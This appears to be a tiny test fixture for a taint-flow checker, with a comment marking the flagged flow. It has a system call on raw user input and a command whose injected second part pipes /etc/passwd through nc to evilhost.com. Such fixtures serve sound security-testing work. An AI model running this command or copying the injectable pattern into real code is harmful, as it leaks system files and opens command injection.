#flag flow taint
system(user_input)
system "ls /usr/local/fileserver/1 & cat /etc/passwd | nc evilhost.com 80"